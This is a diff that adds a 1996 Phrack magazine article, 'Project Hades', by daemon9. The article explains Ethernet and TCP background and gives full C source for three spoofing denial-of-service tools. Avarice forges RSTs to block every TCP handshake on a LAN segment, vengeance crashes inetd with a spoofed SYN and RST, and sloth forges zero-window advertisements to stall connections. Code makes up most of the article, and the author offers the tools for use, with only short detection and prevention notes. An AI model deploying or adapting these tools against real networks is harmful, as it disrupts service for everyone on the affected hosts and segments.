@@ -1,0 +1,1024 @@
+                             .oO Phrack Magazine Oo.
+
+                          Volume Seven, Issue Forty-Nine
+
+                                  File 07 of 16
+
+			        [ Project Hades ]
+
+		           Paper by daemon9 AKA route
+		              sourcecode by daemon9
+			       for Phrack Magazine
+		      October 1996 Guild Productions, kid
+
+	   		comments to route@infonexus.com
+
+
+		--[ Introduction ]--
+
+
+	More explorations of weaknesses in the most widely used transport
+protocol on the Internet.  Put your mind at rest fearful reader!  The 
+vulnerabilities outlined here are nowhere near the devastating nature of 
+Project Neptune/Poseidon.  
+
+	Hades is the Greek god of the underworld; his kingdom is that of the 
+the Dead.  Hades renown for being quite evil and twisted.  He is also well
+known for his TCP exploit code.  Therefore, it seemed fitting to name this
+project after him.
+
+	BTW, for this code to work (as with much of my previous code) your 
+kernel must be patched to be able to spoof packets.  DO NOT MAIL ME to ask how 
+to do it.
+
+
+		--[ Overview  ]--
+
+
+	Section I.	Ethernet background information	
+	Section II.	TCP background information
+	Section III.	Avarice
+	Section IV.	Vengeance
+	Section V.	Sloth
+	Section	VI.	Discussion, Detection, and Prevention
+
+(Note that readers unfamiliar with the TCP/IP protocol suite may wish to first
+read ftp://ftp.infonexus.com/pub/Philes/NetTech/TCP-IP/tcipIp.intro.txt.gz)
+
+
+		Section I.	Ethernet Background information
+
+
+	Ethernet is a multi-drop, connectionless, unreliable link layer 
+protocol.  It (IEEE 802.3 Ethernet is the version I refer to) is the 
+link-layer protocol most LANs are based upon.  It is multidrop; each
+device on the ethernet shares the media (and, consequently, the bandwidth)
+with every other device.  It is connectionless; every frame is sent 
+independently of the previous one and next one.  It is unreliable; frames are 
+not acknowledged by the other end.  If a frame is received that doesn't pass 
+the checksum, it is silently discarded.  It is a link-layer protocol that sits
+underneath the network protocol (IP) and above the physical interface (varies,
+but often CAT3/5 UTP).
+
+
+                --[ Signaling and Encoding ]--
+		
+
+	Standard 802.3 Ethernet signals at 10 mega-bits per second using 
+Manchester encoding to order bits on the wire.  Manchester is a biphase 
+state-transition technique; to indicate a particular bit is on, a voltage 
+transition from low to high is used.  To indicate a bit is off, a high to low
+transition is used.  
+
+
+                --[ Media Access ]--
+
+
+	Ethernet uses media contention to gain access to the shared wire.  The
+version of contention it uses is CSMA/CD (carrier sense multiple access / 
+collision detection).  This simply means that ethernet supports multiple 
+devices on a shared network medium.  Any device can send it's data whenever
+it thinks the wire is clear.  Collisions are detected (causing back-off and
+retry) but not avoided.  CSMA/CD algorithmically:
+
+1. IF: 	 the medium is idle -> transmit.
+2. ELSE: the medium is busy -> wait and listen until idle -> transmit.
+3. IF:	 collision is detected -> transmit jamming signal, cease all 
+	 transmission
+4. IF:	 jamming signal is detected -> wait a random amount of time, goto 1
+	
+
+		--[ Broadcast Medium ]--
+
+
+	Since it is CSMA/CD technology, ethernet has the wonderful property
+that it hears everything on the network.  Under normal circumstances, an
+ethernet NIC will only capture and pass to the network layer packets that 
+boast it's own MAC (link-layer) address or a broadcast MAC address.  However, 
+it is trivial to place an Ethernet card into promiscuous mode where it will
+capture everything it hears, regardless to whom the frame was addressed.
+
+	It bears mentioning that bridges are used to divide an ethernet into
+logically separate segments.  A bridge (or bridging device such as a smart 
+hub) will not pass an ethernet frame from segment to segment unless the 
+addressed host lies on the disparate segment.  This can reduce over-all 
+network load by reducing the amount of traffic on the wire.
+
+
+                Section II.      TCP Background Information
+
+
+        TCP is a connection-oriented, reliable transport protocol.  TCP is
+responsible for hiding network intricacies from the upper layers.  A 
+connection-oriented protocol implies that the two hosts participating in a 
+discussion must first establish a connection before data may be exchanged.  In
+TCP's case, this is done with the three-way handshake.  Reliability can be 
+provided in a number of ways, but the only two we are concerned with are data 
+sequencing and acknowledgment.  TCP assigns sequence numbers to every byte in
+every segment and acknowledges all data bytes received from the other end.  
+(ACK's consume a sequence number, but are not themselves ACK'd.  That would be
+ludicrous.)  
+
+
+                --[ TCP Connection Establishment ]--
+
+
+        In order to exchange data using TCP, hosts must establish a connection.
+TCP establishes a connection in a 3 step process called the 3-way handshake.
+If machine A is running a client program and wishes to connect to a server
+program on machine B, the process is as follows:
+
+                        fig(1)
+       
+        1       A       ---SYN--->      B       
+
+        2       A    <---SYN/ACK---     B
+
+        3       A       ---ACK--->      B
+
+                                
+        At (1) the client is telling the server that it wants a connection.
+This is the SYN flag's only purpose.  The client is telling the server that 
+the sequence number field is valid, and should be checked.  The client will 
+set the sequence number field in the TCP header to it's ISN (initial sequence
+number).  The server, upon receiving this segment (2) will respond with it's 
+own ISN (therefore the SYN flag is on) and an Acknowledgment of the clients 
+first segment (which is the client's ISN+1).  The client then ACK's the 
+server's ISN (3).  Now data transfer may take place.
+
+
+              --[ TCP Control Flags  ]--
+
+
+        There are six TCP control flags. 
+
+SYN:   Synchronize Sequence Numbers
+        The synchronize sequence numbers field is valid.  This flag is only 
+valid during the 3-way handshake.  It tells the receiving TCP to check the 
+sequence number field, and note it's value as the connection-initiator's 
+(usually the client) initial sequence number.  TCP sequence numbers can 
+simply be thought of as 32-bit counters.  They range from 0 to 4,294,967,295.
+Every byte of data exchanged across a TCP connection (along with certain 
+flags) is sequenced.  The sequence number field in the TCP header will contain
+the sequence number of the *first* byte of data in the TCP segment.  
+
+ACK:   Acknowledgment
+        The acknowledgment number field is valid.  This flag is almost always
+set.   The acknowledgment number field in the TCP header holds the value of 
+the next *expected* sequence number (from the other side), and also 
+acknowledges *all* data (from the other side) up through this ACK number minus
+one.
+
+RST:   Reset
+        Destroy the referenced connection.  All memory structures are torn 
+down.
+
+URG:    Urgent 
+        The urgent pointer is valid.  This is TCP's way of implementing out
+of band (OOB) data.  For instance, in a telnet connection a `ctrl-c` on the 
+client side is considered urgent and will cause this flag to be set. 
+
+PSH:    Push
+        The receiving TCP should not queue this data, but rather pass it to 
+the application as soon as possible.  This flag should always be set in 
+interactive connections, such as telnet and rlogin.
+
+FIN:    Finish 
+        The sending TCP is finished transmitting data, but is still open to 
+accepting data.
+
+
+                --[ Ports ]--
+
+       
+        To grant simultaneous access to the TCP module, TCP provides a user 
+interface called a port.  Ports are used by the kernel to identify network 
+processes.  They are strictly transport layer entities.  Together with an 
+IP address, a TCP port provides an endpoint for network communications.  In 
+fact, at any given moment *all* Internet connections can be described by 4 
+numbers: the source IP address and source port and the destination IP 
+address and destination port.  Servers are bound to 'well-known' ports so 
+that they may be located on a standard port on different systems.  
+For example, the telnet daemon sits on TCP port 23.
+        
+
+		Section III.	Avarice
+	
+
+	Avarice is a SYN,RST generator.  It is designed to disallow any
+TCP traffic on the ethernet segment upon which it listens.  It works by
+listening for the 3-way handshake procedure to begin, and then immediately 
+resetting it.  The result is that no TCP based connections can be negotiated, 
+and therefore no TCP traffic can flow.  This version sits on a host, puts the 
+NIC into promiscuous mode and listens for connection-establishment requests.
+When it hears one, it immediately generates a forged RST packet and sends it 
+back to the client.  If the forged RST arrives in time, the client will quit 
+with a message like:
+
+	telnet: Unable to connect to remote host: Connection refused
+
+For the client to accept the RST, it must think it is an actual response from
+the server.  This requires 3 pieces of information: IP address, TCP port, and 
+TCP acknowledgment number.  All of this information is gleaned from the 
+original SYN packet:  the IP address of the destination host, the TCP port 
+of the listening process, and the clients ISN (the acknowledgment number in 
+the RST packet is the clients ISN+1, as SYN's consume a sequence number).
+
+	This program has a wide range of effectiveness.  Speed is essential
+for avarice to quell all TCP traffic on a segment.  We are basically racing 
+the kernel.  OS kernels tend to be rather efficient at building packets.  If 
+run on a fast machine, with a fast kernel, it's kill rate is rather high.  
+I have seen kill-rates as high as 98% (occasionally a few slip through) on 
+a fast machine.  Consequently, if run on a slow machine, with a slow kernel, it
+will likely be useless.  If the RSTs arrive too late, they will be dropped by 
+the client, as the ACK number will be too low for the referenced connection.  
+Sure, the program could send, say, 10 packets, each with progressively higher 
+ACK numbers, but hey, this is a lame program...
+
+
+		Section IV.	Vengeance
+
+
+	Vengeance is an inetd killer.  On affected systems this program will
+cause inetd to become unstable and die after the next connection attempt.
+It sends a connection-request immediately followed by a RST to an internal 
+inetd managed service, such as time or daytime.  Inetd is now unstable and
+will die after the next attempt at a connection.  Simple.  Dumb.  Not eleet.
+(This inetd bug should be fixed or simply not present in newer inetd code.) 
+
+	I did not add code to make the legitimate connection that would kill
+inetd to this simple little program for 2 reasons.  1) It's simply not worth 
+the complexity to add sequence number prediction to create a spoofed 3-way 
+handshake.  This program is too dinky.  2) Maybe the attacker would want 
+to leave inetd in a unstable state and let some legitimate user come along and
+kill it.  Who knows.  Who cares.  Blah.  I wash my hands of the whole affair.
+
+
+		Section V.	Sloth
+
+
+	"Make your ethernet feel like a lagged 28.8 modem link!"
+
+	Sloth is an experiment.  It is an experiment in just how lame IP 
+spoofing can get.  It works much the same way avarice does, except it sends 
+forged TCP window advertisements.  By default Sloth will spoof zero-size 
+window advertisements which will have the effect of slowing interactive 
+traffic considerably.  In fact, in some instances, it will freeze a 
+connection all together.  This is because when a TCP receives a zero-size 
+window advertisement, it will stop sending data, and start sending window 
+probes (a window probe is nothing more than an ACK with one byte of 
+data) to see if the window size has increased.  Since window probes are, in 
+essence, nothing more than acknowledgements, they can get lost.  Because of 
+this fact, TCP implements a timer to cordinate the repeated sending of these 
+packets.  Window probes are sent according to the persist timer (a 500ms 
+timer) which is calculated by TCP's exponential backoff algorithm.  Sloth 
+will see each window probe, and spoof a 0-size window to the sender.  This 
+all works out to cause mass mayhem, and makes it difficult for either TCP to 
+carry on a legitimate conversation.  
+
+	Sloth, like avarice, is only effective on faster machines.  It also
+only works well with interactive traffic.
+
+		
+		Section	VI.	Discussion, Detection, and Prevention
+
+
+	Avarice is simply a nasty program.  What more do you want from me?
+Detection?  Detection would require an ounce of clue.  Do FTP, SMTP, HTTP, 
+POP, telnet, etc all suddenly break at the same time on every machine on 
+the LAN?  Could be this program.  Break out the sniffer.  Monitor the network 
+and look for the machine that generating the RSTs.  This version of the program
+does not spoof its MAC address, so look for that.  To really prevent this 
+attack, add cryptographic authentication to the TCP kernels on your machines.
+
+	Vengeance is a wake-up call.  If you haven't patched your inetd to be
+resistant to this attack, you should now.  If your vendor hasn't been 
+forthcoming with a patch, they should now.  Detection is using this 
+program.  Prevention is a patch.  Prevention is disabling the internal inetd 
+services.
+
+	Sloth can be detected and dealt with in much the same way as avarice.
+
+	You may have noticed that these programs are named after three of
+the Seven Deadly Sins.  You may be wondering if that implies that there will 
+be four more programs of similar ilk.  Well, STOP WONDERING.  The answer is 
+NO.  I am officially *out* of the D.O.S. business.  I am now putting my efforts
+towards more productive ventures.  Next issue, a session jacker.
+
+
+This project made possible by a grant from the Guild Corporation.
+
+
+-------------------------------8<-------cut-me-loose--------------------------
+
+
+/*
+                            The Hades Project
+		    Explorations in the Weakness of TCP
+			   SYN -> RST generator
+			        (avarice)
+                                 v. 1.0
+
+                        daemon9/route/infinity
+
+                     October 1996 Guild productions
+
+                     comments to route@infonexus.com
+
+
+   This coding project made possible by a grant from the Guild corporation
+
+*/
+
+#include "lnw.h"
+
+void main(){
+
+	void reset(struct iphdr *,struct tcphdr *,int);
+
+	struct epack{				/* Generic Ethernet packet w/o data payload */
+		struct ethhdr eth;		/* Ethernet Header */
+		struct iphdr ip;		/* IP header */
+		struct tcphdr tcp;		/* TCP header */
+	}epack;
+
+	int sock,shoe,dlen;
+	struct sockaddr dest;
+	struct iphdr  *iphp;
+	struct tcphdr *tcphp;
+
+	if(geteuid()||getuid()){
+                fprintf(stderr,"UID or EUID of 0 needed...\n");
+                exit(0);
+        }
+	sock=tap(DEVICE);		/* Setup the socket and device */
+
+				/* Could use the SOCK_PACKET but building Ethernet headers would
+				 require more time overhead; the kernel can do it quicker then me */
+	if((shoe=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0){
+                perror("\nHmmm.... socket problems");
+                exit(1);
+        }  
+	shadow();			/* Run as a daemon */ 
+	
+	iphp=(struct iphdr *)(((unsigned long)&epack.ip)-2);
+  	tcphp=(struct tcphdr *)(((unsigned long)&epack.tcp)-2);   
+
+   	/* Network reading loop / RSTing portion */
+	while(1)if(recvfrom(sock,&epack,sizeof(epack),0,&dest,&dlen))if(iphp->protocol==IPPROTO_TCP&&tcphp->syn)reset(iphp,tcphp,shoe);
+}
+
+
+/*
+ *	Build a packet and send it off.
+ */
+
+void reset(iphp,tcphp,shoe)
+struct iphdr *iphp;
+struct tcphdr *tcphp;
+int shoe;
+{
+   	
+	void dump(struct iphdr *,struct tcphdr *);
+        
+        struct tpack{			/* Generic TCP packet w/o payload */
+                struct iphdr ip;	
+                struct tcphdr tcp;
+        }tpack;                
+        
+        struct pseudo_header{           /* For TCP header checksum */
+                unsigned source_address;
+                unsigned dest_address;
+                unsigned char placeholder;
+                unsigned char protocol;
+                unsigned short tcp_length;
+                struct tcphdr tcp;
+        }pheader;
+  
+   	struct sockaddr_in sin;         /* IP address information */
+                        		/* Setup the sin struct with addressing information */
+      	sin.sin_family=AF_INET;  	/* Internet address family */
+        sin.sin_port=tcphp->dest;       /* Source port */
+        sin.sin_addr.s_addr=iphp->saddr;/* Dest. address */
+
+                        /* Packet assembly begins here */
+        
+                                /* Fill in all the TCP header information */
+
+        tpack.tcp.source=tcphp->dest;   /* 16-bit Source port number */
+        tpack.tcp.dest=tcphp->source;   /* 16-bit Destination port */
+        tpack.tcp.seq=0;        	/* 32-bit Sequence Number */
+        tpack.tcp.ack_seq=htonl(ntohl(tcphp->seq)+1);    /* 32-bit Acknowledgement Number */
+        tpack.tcp.doff=5;              	/* Data offset */
+        tpack.tcp.res1=0;              	/* reserved */
+        tpack.tcp.res2=0;              	/* reserved */
+      	tpack.tcp.urg=0;               	/* Urgent offset valid flag */
+        tpack.tcp.ack=1;               	/* Acknowledgement field valid flag */
+        tpack.tcp.psh=0;               	/* Push flag */
+        tpack.tcp.rst=1;               	/* Reset flag */
+        tpack.tcp.syn=0;               	/* Synchronize sequence numbers flag */
+        tpack.tcp.fin=0;               	/* Finish sending flag */
+        tpack.tcp.window=0;	 	/* 16-bit Window size */
+        tpack.tcp.check=0;             	/* 16-bit checksum (to be filled in below) */
+        tpack.tcp.urg_ptr=0;           	/* 16-bit urgent offset */
+        
+                                /* Fill in all the IP header information */
+        
+        tpack.ip.version=4;            	/* 4-bit Version */
+        tpack.ip.ihl=5;                	/* 4-bit Header Length */
+        tpack.ip.tos=0;                	/* 8-bit Type of service */
+    	tpack.ip.tot_len=htons(IPHDR+TCPHDR);  /* 16-bit Total length */
+        tpack.ip.id=0;         		/* 16-bit ID field */
+        tpack.ip.frag_off=0;           	/* 13-bit Fragment offset */
+        tpack.ip.ttl=64;	        /* 8-bit Time To Live */
+        tpack.ip.protocol=IPPROTO_TCP; 	/* 8-bit Protocol */
+        tpack.ip.check=0;              	/* 16-bit Header checksum (filled in below) */
+        tpack.ip.saddr=iphp->daddr;    	/* 32-bit Source Address */
+        tpack.ip.daddr=iphp->saddr;    	/* 32-bit Destination Address */
+        
+        pheader.source_address=(unsigned)tpack.ip.saddr;
+        pheader.dest_address=(unsigned)tpack.ip.daddr;
+        pheader.placeholder=0;
+     	pheader.protocol=IPPROTO_TCP;
+        pheader.tcp_length=htons(TCPHDR);
+        
+     			/* IP header checksum */
+        
+      	tpack.ip.check=in_cksum((unsigned short *)&tpack.ip,IPHDR);
+                
+			/* TCP header checksum */
+                                
+        bcopy((char *)&tpack.tcp,(char *)&pheader.tcp,TCPHDR);
+       	tpack.tcp.check=in_cksum((unsigned short *)&pheader,TCPHDR+12);
+
+	sendto(shoe,&tpack,IPHDR+TCPHDR,0,(struct sockaddr *)&sin,sizeof(sin));
+#ifndef QUIET
+	dump(iphp,tcphp);
+#endif
+}
+
+/* 
+ *	Dumps some info...
+ */
+
+void dump(iphp,tcphp)
+struct iphdr *iphp;
+struct tcphdr *tcphp;
+{
+	fprintf(stdout,"Connection-establishment Attempt: ");
+   	fprintf(stdout,"%s [%d] --> %s [%d]\n",hostLookup(iphp->saddr),ntohs(tcphp->source),hostLookup(iphp->daddr),ntohs(tcphp->dest)); 
+	fprintf(stdout,"Thwarting...\n");
+}
+
+-------------------------------8<-------cut-me-loose--------------------------
+
+/*
+                            The Hades Project
+                    Explorations in the Weakness of TCP
+                              Inetd Killer
+			       (vengance)
+                                 v. 1.0
+
+                        daemon9/route/infinity
+
+                     October 1996 Guild productions
+
+                     comments to route@infonexus.com
+
+
+   This coding project made possible by a grant from the Guild corporation
+*/
+
+
+#include "lnw.h"
+
+void main()
+{
+
+	void s3nd(int,int,unsigned,unsigned short,unsigned);
+	void usage(char *);
+	unsigned nameResolve(char *);	
+
+	int sock,mode,i=0;
+	char buf[BUFSIZE];
+	unsigned short port;
+	unsigned target=0,source=0;
+     	char werd[]={"\n\n\n\nHades is a Guild Corporation Production.  c.1996\n\n"}; 
+
+	if(geteuid()||getuid()){
+                fprintf(stderr,"UID or EUID of 0 needed...\n");
+                exit(0);
+        }
+
+	if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0){
+                perror("\nHmmm.... socket problems");
+                exit(1);
+        }  
+
+	printf(werd);
+
+	printf("\nEnter target address-> ");
+        fgets(buf,sizeof(buf)-1,stdin);
+	if(!buf[1])exit(0);
+        while(buf[i]!='\n')i++;                 /* Strip the newline */
+        buf[i]=0;
+	target=nameResolve(buf);
+        bzero((char *)buf,sizeof(buf));
+
+	printf("\nEnter source address to spoof-> ");
+        fgets(buf,sizeof(buf)-1,stdin);
+	if(!buf[1])exit(0);        
+	while(buf[i]!='\n')i++;                 /* Strip the newline */
+        buf[i]=0;
+	source=nameResolve(buf);
+        bzero((char *)buf,sizeof(buf));
+
+	printf("\nEnter target port (should be 13, 37, or some internal service)-> ");
+        fgets(buf,sizeof(buf)-1,stdin);
+        if(!buf[1])exit(0);
+	port=(unsigned short)atoi(buf);
+    
+	fprintf(stderr,"Attempting to upset inetd...\n\n");
+
+	s3nd(sock,0,target,port,source);	/* SYN */
+	s3nd(sock,1,target,port,source);	/* RST */
+
+	fprintf(stderr,"At this point, if the host is vulnerable, inetd is unstable.\nTo verfiy: `telnet target.com {internal service port #}`.  Do this twice.\nInetd should allow the first connection, but send no data, then die.\nThe second telnet will verify t
+
+
+
+
+
+
+
+his.\n"); 
+}
+
+/*
+ *	Build a packet and send it off.
+ */
+
+void s3nd(int sock,int mode,unsigned target,unsigned short port,unsigned source){
+   	
+        struct pkt{
+                struct iphdr ip;
+                struct tcphdr tcp;
+        }packet;                
+        
+        struct pseudo_header{           /* For TCP header checksum */
+                unsigned source_address;
+                unsigned dest_address;
+                unsigned char placeholder;
+                unsigned char protocol;
+                unsigned short tcp_length;
+                struct tcphdr tcp;
+        }pseudo_header;
+  
+   	struct sockaddr_in sin;         /* IP address information */
+                        		/* Setup the sin struct with addressing information */
+      	sin.sin_family=AF_INET;  	/* Internet address family */
+        sin.sin_port=666;       	/* Source port */
+        sin.sin_addr.s_addr=target;  	/* Dest. address */
+
+                        /* Packet assembly begins here */
+        
+                                /* Fill in all the TCP header information */
+        
+        packet.tcp.source=htons(666);        	/* 16-bit Source port number */
+        packet.tcp.dest=htons(port);   		/* 16-bit Destination port */
+        if(mode)packet.tcp.seq=0;        	/* 32-bit Sequence Number */
+        else packet.tcp.seq=htonl(10241024);
+	if(!mode)packet.tcp.ack_seq=0;    	/* 32-bit Acknowledgement Number */
+	else packet.tcp.ack_seq=htonl(102410000);
+        packet.tcp.doff=5;              	/* Data offset */
+        packet.tcp.res1=0;              	/* reserved */
+        packet.tcp.res2=0;              	/* reserved */
+      	packet.tcp.urg=0;               	/* Urgent offset valid flag */
+        packet.tcp.ack=0;               	/* Acknowledgement field valid flag */
+        packet.tcp.psh=0;               	/* Push flag */
+        if(!mode)packet.tcp.rst=0;               /* Reset flag */
+        else packet.tcp.rst=1;
+	if(!mode)packet.tcp.syn=1;               /* Synchronize sequence numbers flag */
+	else packet.tcp.syn=0;
+        packet.tcp.fin=0;               	/* Finish sending flag */
+        packet.tcp.window=htons(512);	 	/* 16-bit Window size */
+        packet.tcp.check=0;             	/* 16-bit checksum (to be filled in below) */
+        packet.tcp.urg_ptr=0;           	/* 16-bit urgent offset */
+        
+                                /* Fill in all the IP header information */
+        
+        packet.ip.version=4;            	/* 4-bit Version */
+        packet.ip.ihl=5;                	/* 4-bit Header Length */
+        packet.ip.tos=0;                	/* 8-bit Type of service */
+    	packet.ip.tot_len=htons(IPHDR+TCPHDR);  /* 16-bit Total length */
+        packet.ip.id=0;         		/* 16-bit ID field */
+        packet.ip.frag_off=0;           	/* 13-bit Fragment offset */
+        packet.ip.ttl=64;	              	/* 8-bit Time To Live */
+        packet.ip.protocol=IPPROTO_TCP; 	/* 8-bit Protocol */
+        packet.ip.check=0;              	/* 16-bit Header checksum (filled in below) */
+        packet.ip.saddr=source;           /* 32-bit Source Address */
+        packet.ip.daddr=target;           /* 32-bit Destination Address */
+        
+        pseudo_header.source_address=(unsigned)packet.ip.saddr;
+        pseudo_header.dest_address=(unsigned)packet.ip.daddr;
+        pseudo_header.placeholder=0;
+     	pseudo_header.protocol=IPPROTO_TCP;
+        pseudo_header.tcp_length=htons(TCPHDR);
+        
+     			/* IP header checksum */
+        
+      	packet.ip.check=in_cksum((unsigned short *)&packet.ip,IPHDR);
+                
+			/* TCP header checksum */
+                                
+        bcopy((char *)&packet.tcp,(char *)&pseudo_header.tcp,IPHDR);
+       	packet.tcp.check=in_cksum((unsigned short *)&pseudo_header,TCPHDR+12);
+
+	sendto(sock,&packet,IPHDR+TCPHDR,0,(struct sockaddr *)&sin,sizeof(sin));
+}
+
+-------------------------------8<-------cut-me-loose--------------------------
+
+/*
+                            The Hades Project
+                    Explorations in the Weakness of TCP
+                          TCP Window Starvation
+                                 (sloth)
+                                 v. 1.0
+
+                        daemon9/route/infinity
+
+                     October 1996 Guild productions
+
+                     comments to route@infonexus.com
+
+
+   This coding project made possible by a grant from the Guild corporation
+
+*/
+
+
+#include "lnw.h"
+
+	/* experiment with this value.  Different things happen with different sizes */
+
+#define SLOTHWINDOW	0
+
+void main(){
+
+	void sl0th(struct iphdr *,struct tcphdr *,int);
+
+	struct epack{				/* Generic Ethernet packet w/o data payload */
+		struct ethhdr eth;		/* Ethernet Header */
+		struct iphdr ip;		/* IP header */
+		struct tcphdr tcp;		/* TCP header */
+	}epack;
+
+	int sock,shoe,dlen;
+	struct sockaddr dest;
+	struct iphdr  *iphp;
+	struct tcphdr *tcphp;
+
+	if(geteuid()||getuid()){
+                fprintf(stderr,"UID or EUID of 0 needed...\n");
+                exit(0);
+        }
+	sock=tap(DEVICE);		/* Setup the socket and device */
+
+				/* Could use the SOCK_PACKET but building Ethernet headers would
+				 require more time overhead; the kernel can do it quicker then me */
+	if((shoe=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0){
+                perror("\nHmmm.... socket problems");
+                exit(1);
+        }  
+	shadow();			/* Run as a daemon */	
+
+	iphp=(struct iphdr *)(((unsigned long)&epack.ip)-2);
+  	tcphp=(struct tcphdr *)(((unsigned long)&epack.tcp)-2);   
+
+   	/* Network reading loop */
+	while(1)if(recvfrom(sock,&epack,sizeof(epack),0,&dest,&dlen))if(iphp->protocol==IPPROTO_TCP&&tcphp->ack)sl0th(iphp,tcphp,shoe);
+}
+
+
+/*
+ *	Build a packet and send it off.
+ */
+
+void sl0th(iphp,tcphp,shoe)
+struct iphdr *iphp;
+struct tcphdr *tcphp;
+int shoe;
+{
+   	
+	void dump(struct iphdr *,struct tcphdr *);
+        
+        struct tpack{			/* Generic TCP packet w/o payload */
+                struct iphdr ip;	
+                struct tcphdr tcp;
+        }tpack;                
+        
+        struct pseudo_header{           /* For TCP header checksum */
+                unsigned source_address;
+                unsigned dest_address;
+                unsigned char placeholder;
+                unsigned char protocol;
+                unsigned short tcp_length;
+                struct tcphdr tcp;
+        }pheader;
+  
+   	struct sockaddr_in sin;         /* IP address information */
+                        		/* Setup the sin struct with addressing information */
+      	sin.sin_family=AF_INET;  	/* Internet address family */
+        sin.sin_port=tcphp->dest;       /* Source port */
+        sin.sin_addr.s_addr=iphp->saddr;/* Dest. address */
+
+                        /* Packet assembly begins here */
+        
+                                /* Fill in all the TCP header information */
+
+        tpack.tcp.source=tcphp->dest;   /* 16-bit Source port number */
+        tpack.tcp.dest=tcphp->source;   /* 16-bit Destination port */
+        tpack.tcp.seq=htonl(ntohl(tcphp->ack_seq));    /* 32-bit Sequence Number */
+        tpack.tcp.ack_seq=htonl(ntohl(tcphp->seq));    /* 32-bit Acknowledgement Number */
+        tpack.tcp.doff=5;              	/* Data offset */
+        tpack.tcp.res1=0;              	/* reserved */
+        tpack.tcp.res2=0;              	/* reserved */
+      	tpack.tcp.urg=0;               	/* Urgent offset valid flag */
+        tpack.tcp.ack=1;               	/* Acknowledgement field valid flag */
+        tpack.tcp.psh=0;               	/* Push flag */
+        tpack.tcp.rst=0;               	/* Reset flag */
+        tpack.tcp.syn=0;               	/* Synchronize sequence numbers flag */
+        tpack.tcp.fin=0;               	/* Finish sending flag */
+        tpack.tcp.window=htons(SLOTHWINDOW);	 /* 16-bit Window size */
+        tpack.tcp.check=0;             	/* 16-bit checksum (to be filled in below) */
+        tpack.tcp.urg_ptr=0;           	/* 16-bit urgent offset */
+        
+                                /* Fill in all the IP header information */
+        
+        tpack.ip.version=4;            	/* 4-bit Version */
+        tpack.ip.ihl=5;                	/* 4-bit Header Length */
+        tpack.ip.tos=0;                	/* 8-bit Type of service */
+    	tpack.ip.tot_len=htons(IPHDR+TCPHDR);  /* 16-bit Total length */
+        tpack.ip.id=0;         		/* 16-bit ID field */
+        tpack.ip.frag_off=0;           	/* 13-bit Fragment offset */
+        tpack.ip.ttl=64;	        /* 8-bit Time To Live */
+        tpack.ip.protocol=IPPROTO_TCP; 	/* 8-bit Protocol */
+        tpack.ip.check=0;              	/* 16-bit Header checksum (filled in below) */
+        tpack.ip.saddr=iphp->daddr;    	/* 32-bit Source Address */
+        tpack.ip.daddr=iphp->saddr;    	/* 32-bit Destination Address */
+        
+        pheader.source_address=(unsigned)tpack.ip.saddr;
+        pheader.dest_address=(unsigned)tpack.ip.daddr;
+        pheader.placeholder=0;
+     	pheader.protocol=IPPROTO_TCP;
+        pheader.tcp_length=htons(TCPHDR);
+        
+     			/* IP header checksum */
+        
+      	tpack.ip.check=in_cksum((unsigned short *)&tpack.ip,IPHDR);
+                
+			/* TCP header checksum */
+                                
+        bcopy((char *)&tpack.tcp,(char *)&pheader.tcp,TCPHDR);
+       	tpack.tcp.check=in_cksum((unsigned short *)&pheader,TCPHDR+12);
+
+	sendto(shoe,&tpack,IPHDR+TCPHDR,0,(struct sockaddr *)&sin,sizeof(sin));
+#ifndef QUIET
+	dump(iphp,tcphp);
+#endif
+}
+
+/* 
+ *	Dumps some info...
+ */
+
+void dump(iphp,tcphp)
+struct iphdr *iphp;
+struct tcphdr *tcphp;
+{
+	fprintf(stdout,"Hmm... I smell an ACK: ");
+   	fprintf(stdout,"%s [%d] --> %s [%d]\n",hostLookup(iphp->saddr),ntohs(tcphp->source),hostLookup(iphp->daddr),ntohs(tcphp->dest)); 
+	fprintf(stdout,"let's slow things down a bit\n");
+}
+
+
+-------------------------------8<-------cut-me-loose--------------------------
+
+
+/*
+		Basic Linux Networking Header Information. v1.0
+
+   		   c. daemon9, Guild Corporation 1996
+
+Includes:
+
+	tap
+	in_cksum
+	nameResolve
+	hostLookup	
+	shadow
+	reaper
+
+	This is beta.  Expect it to expand greatly the next time around ...
+	Sources from all over the map.
+
+		code from:
+			route
+			halflife
+*/
+
+#include <string.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <syslog.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <sys/time.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+#include <linux/socket.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <linux/if_ether.h>
+#include <linux/if.h>
+
+#define DEVICE 		"eth0"
+#define BUFSIZE 	256
+#define ETHHDR 		14
+#define TCPHDR 		20
+#define IPHDR  		20
+#define ICMPHDR 	8
+
+
+/*
+ *      IP address into network byte order
+ */
+                 
+unsigned nameResolve(char *hostname){
+        
+        struct in_addr addr;
+        struct hostent *hostEnt; 
+   
+        if((addr.s_addr=inet_addr(hostname))==-1){
+                if(!(hostEnt=gethostbyname(hostname))){
+                        fprintf(stderr,"Name lookup failure: `%s`\n",hostname);
+                        exit(0);
+                }
+                bcopy(hostEnt->h_addr,(char *)&addr.s_addr,hostEnt->h_length);
+        }
+        return addr.s_addr;
+}
+ 
+/*
+ *      IP Family checksum routine
+ */
+
+unsigned short in_cksum(unsigned short *ptr,int nbytes){
+                        
+        register long           sum;            /* assumes long == 32 bits */
+        u_short                 oddbyte;
+        register u_short        answer;         /* assumes u_short == 16 bits */
+                        
+        /*
+         * Our algorithm is simple, using a 32-bit accumulator (sum),
+         * we add sequential 16-bit words to it, and at the end, fold back 
+         * all the carry bits from the top 16 bits into the lower 16 bits. 
+         */
+        
+        sum = 0;
+        while (nbytes > 1)  {
+                sum += *ptr++;
+                nbytes -= 2;    
+        }
+                        
+                                /* mop up an odd byte, if necessary */
+        if (nbytes == 1) {
+                oddbyte = 0;            /* make sure top half is zero */
+                *((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
+                sum += oddbyte;
+        }               
+  
+        /*
+         * Add back carry outs from top 16 bits to low 16 bits.
+         */
+         
+        sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
+        sum += (sum >> 16);                     /* add carry */
+        answer = ~sum;          /* ones-complement, then truncate to 16 bits */
+        return(answer);
+}
+
+
